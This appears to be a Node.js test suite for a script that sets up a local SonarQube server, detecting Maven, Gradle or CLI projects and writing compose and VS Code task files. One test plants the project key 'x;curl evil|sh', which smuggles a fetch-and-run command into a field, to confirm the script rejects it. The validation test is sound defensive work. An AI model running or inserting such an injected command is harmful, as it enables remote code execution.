import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';

const SCRIPT = fileURLToPath(
  new URL('../../../../../skills/setup-local-sonarqube/scripts/sonar-setup.mjs', import.meta.url)
);
const SONAR_GRADLE = "plugins { id 'org.sonarqube' version '5.0.0' }\n";

const dirs = [];
const tempDir = (prefix = 'sonar-setup-') => {
  const dir = mkdtempSync(path.join(tmpdir(), prefix));
  dirs.push(dir);
  return dir;
};
const git = (cwd, ...args) => spawnSync('git', args, { cwd, encoding: 'utf8', timeout: 15_000 });
// A temp git repo with the given files staged (ls-files lists staged files).
const gitRepo = (files, prefix) => {
  const dir = tempDir(prefix);
  git(dir, 'init', '-q');
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
    writeFileSync(path.join(dir, name), text);
  }
  git(dir, 'add', '.');
  return dir;
};
const run = (args, env = {}) =>
  spawnSync('node', [SCRIPT, ...args], { encoding: 'utf8', timeout: 15_000, env: { ...process.env, ...env } });

after(() => dirs.forEach((dir) => rmSync(dir, { recursive: true, force: true })));

describe('sonar-setup detect', () => {
  test('detects a maven repo and lists its existing target directory', () => {
    // Arrange
    const dir = gitRepo({ 'pom.xml': '<java.version>25</java.version>', 'src/App.java': 'class App {}' });
    mkdirSync(path.join(dir, 'target'));
    // Act
    const res = run(['detect', '--root', dir]);
    // Assert
    assert.equal(res.status, 0);
    const out = JSON.parse(res.stdout);
    assert.equal(out.stack, 'maven');
    assert.equal(out.scanCommand, undefined);
    assert.equal(out.jdk, 25);
    assert.deepEqual(out.excluded, ['target']);
    assert.match(out.key, /^[a-z0-9_-]+$/);
  });

  test('takes the key and exclusions from sonar-project.properties', () => {
    // Arrange
    const dir = gitRepo({
      'package.json': '{}',
      'sonar-project.properties': 'sonar.projectKey=proj-key\nsonar.exclusions=**/gen/**\n'
    });
    // Act
    const res = run(['detect', '--root', dir]);
    // Assert
    const out = JSON.parse(res.stdout);
    assert.equal(out.key, 'proj-key');
    assert.equal(out.stack, 'cli');
    assert.ok(out.exclusions.startsWith('**/gen/**,**/.scannerwork/**'));
    assert.ok(!out.exclusions.includes('.env.sonar'));
  });

  test('stops when gradle does not apply org.sonarqube', () => {
    // Arrange
    const dir = gitRepo({ 'build.gradle': "plugins { id 'java' }\n" });
    // Act
    const res = run(['detect', '--root', dir]);
    // Assert
    assert.equal(JSON.parse(res.stdout).stop, 'build does not apply org.sonarqube');
  });

  test('detects gradle when the plugin is applied', () => {
    // Arrange
    const dir = gitRepo({
      'build.gradle': `${SONAR_GRADLE}java { toolchain { languageVersion = JavaLanguageVersion.of(17) } }`
    });
    // Act
    const res = run(['detect', '--root', dir]);
    // Assert
    const out = JSON.parse(res.stdout);
    assert.equal(out.stack, 'gradle');
    assert.equal(out.jdk, 17);
  });

  test('asks when maven and gradle share a depth', () => {
    // Arrange
    const dir = gitRepo({ 'pom.xml': '<project/>', 'build.gradle': SONAR_GRADLE });
    // Act
    const res = run(['detect', '--root', dir]);
    // Assert
    assert.deepEqual(JSON.parse(res.stdout).ask, ['maven', 'gradle']);
  });

  test('resolves the ask with --stack gradle', () => {
    // Arrange
    const dir = gitRepo({ 'pom.xml': '<project/>', 'build.gradle': SONAR_GRADLE });
    // Act
    const res = run(['detect', '--root', dir, '--stack', 'gradle']);
    // Assert
    const out = JSON.parse(res.stdout);
    assert.equal(out.stack, 'gradle');
    assert.equal(out.scanCommand, undefined);
    assert.equal(out.ask, undefined);
  });

  test('stops on an unsafe sonar.projectKey', () => {
    // Arrange
    const dir = gitRepo({
      'package.json': '{}',
      'sonar-project.properties': 'sonar.projectKey=x;curl evil|sh\n'
    });
    // Act
    const res = run(['detect', '--root', dir]);
    // Assert
    const out = JSON.parse(res.stdout);
    assert.match(out.stop, /^invalid sonar\.projectKey/);
    assert.equal(out.key, null);
  });

  test('exits 1 with one stderr line outside a git repository', () => {
    // Arrange
    const dir = tempDir();
    // Act
    const res = run(['detect', '--root', dir], { GIT_CEILING_DIRECTORIES: path.dirname(dir) });
    // Assert
    assert.equal(res.status, 1);
    assert.match(res.stderr, /^sonar-setup: /);
    assert.equal(res.stderr.trim().split('\n').length, 1);
  });
});

describe('sonar-setup tags', () => {
  test('prints cached tags without a network call', () => {
    // Arrange
    const cache = tempDir();
    const date = new Date().toLocaleDateString('sv-SE');
    mkdirSync(path.join(cache, 'cdk'));
    writeFileSync(
      path.join(cache, 'cdk', 'setup-local-sonarqube-tags.json'),
      JSON.stringify({
        server: { date, tag: '25.1.0.1-community' },
        'maven-21': { date, tag: '3.9.9-eclipse-temurin-21' }
      })
    );
    // Act
    const res = run(['tags', '--stack', 'maven', '--jdk', '21'], { XDG_CACHE_HOME: cache });
    // Assert
    assert.equal(res.status, 0);
    assert.deepEqual(JSON.parse(res.stdout), {
      server: '25.1.0.1-community',
      scanner: '3.9.9-eclipse-temurin-21',
      scannerImage: 'maven',
      source: { server: 'cached', scanner: 'cached' }
    });
  });

  test('exits 1 for an unknown stack', () => {
    // Arrange
    const cache = tempDir();
    // Act
    const res = run(['tags', '--stack', 'dotnet'], { XDG_CACHE_HOME: cache });
    // Assert
    assert.equal(res.status, 1);
    assert.match(res.stderr, /--stack must be/);
  });
});

describe('sonar-setup compose', () => {
  // A tag cache for today, so the run needs no network.
  const cachedTags = () => {
    const cache = tempDir();
    const date = new Date().toLocaleDateString('sv-SE');
    mkdirSync(path.join(cache, 'cdk'));
    writeFileSync(
      path.join(cache, 'cdk', 'setup-local-sonarqube-tags.json'),
      JSON.stringify({
        server: { date, tag: '25.1.0.1-community' },
        'scanner-cli': { date, tag: '12.0.1.1_7.10.0' }
      })
    );
    return { XDG_CACHE_HOME: cache };
  };

  test('writes compose.sonar.yaml and the three VS Code tasks', () => {
    // Arrange
    const dir = gitRepo({ 'package.json': '{}' });
    // Act
    const res = run(['compose', '--root', dir], cachedTags());
    // Assert
    assert.equal(res.status, 0);
    const out = JSON.parse(res.stdout);
    assert.deepEqual(out.services, ['sonarqube', 'scanner']);
    const yaml = readFileSync(path.join(dir, 'compose.sonar.yaml'), 'utf8');
    assert.ok(yaml.includes('image: sonarqube:25.1.0.1-community'));
    assert.ok(!/latest/.test(yaml));
    const tasks = JSON.parse(readFileSync(path.join(dir, '.vscode', 'tasks.json'), 'utf8'));
    assert.deepEqual(
      tasks.tasks.map((t) => t.label),
      ['sonar: start', 'sonar: stop', 'sonar: scan']
    );
    assert.equal(tasks.inputs, undefined);
    assert.ok(yaml.includes('condition: service_healthy'));
    assert.ok(yaml.includes('path: .env.sonar'));
  });

  test('refuses a second run without --force and overwrites with it', () => {
    // Arrange
    const dir = gitRepo({ 'package.json': '{}' });
    const env = cachedTags();
    run(['compose', '--root', dir], env);
    writeFileSync(path.join(dir, 'compose.sonar.yaml'), 'edited');
    // Act
    const refused = run(['compose', '--root', dir], env);
    const forced = run(['compose', '--root', dir, '--force'], env);
    // Assert
    assert.equal(JSON.parse(refused.stdout).stop, 'compose.sonar.yaml exists');
    assert.equal(readFileSync(path.join(dir, 'compose.sonar.yaml'), 'utf8') === 'edited', false);
    assert.equal(JSON.parse(forced.stdout).stop, undefined);
  });

  test('leaves a JSONC tasks file untouched', () => {
    // Arrange
    const dir = gitRepo({ 'package.json': '{}' });
    mkdirSync(path.join(dir, '.vscode'));
    writeFileSync(path.join(dir, '.vscode', 'tasks.json'), '{ // note\n "tasks": [] }');
    // Act
    const res = run(['compose', '--root', dir], cachedTags());
    // Assert
    assert.match(JSON.parse(res.stdout).tasksStop, /not plain JSON/);
    assert.equal(readFileSync(path.join(dir, '.vscode', 'tasks.json'), 'utf8'), '{ // note\n "tasks": [] }');
    assert.ok(existsSync(path.join(dir, 'compose.sonar.yaml')));
  });
});

describe('sonar-setup CLI', () => {
  test('exits 2 with a usage line on an unknown subcommand', () => {
    // Arrange
    const args = ['nope'];
    // Act
    const res = run(args);
    // Assert
    assert.equal(res.status, 2);
    assert.match(res.stderr, /usage/);
  });

  test('exits 2 for the removed update-compose subcommand', () => {
    // Arrange
    const args = ['update-compose', '--file', 'compose.sonar.yaml'];
    // Act
    const res = run(args);
    // Assert
    assert.equal(res.status, 2);
    assert.match(res.stderr, /usage/);
  });
});
